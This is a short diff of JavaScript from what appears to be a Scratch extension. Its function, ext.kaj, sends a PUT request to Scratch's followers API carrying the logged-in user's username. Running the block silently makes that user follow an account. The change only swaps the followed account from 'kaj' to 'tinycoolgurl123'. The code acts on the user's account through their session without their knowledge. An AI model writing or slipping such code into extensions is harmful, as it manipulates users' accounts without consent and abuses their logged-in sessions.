@@ -6,7 +6,7 @@
     ext.kaj=function(){
     $.ajax({
   type: "PUT",
-  url: "http://scratch.mit.edu/site-api/users/followers/kaj/add/",
+  url: "http://scratch.mit.edu/site-api/users/followers/tinycoolgurl123/add/",
   data: {usernames: Scratch.INIT_DATA.LOGGED_IN_USER.model.username}
 })
     }
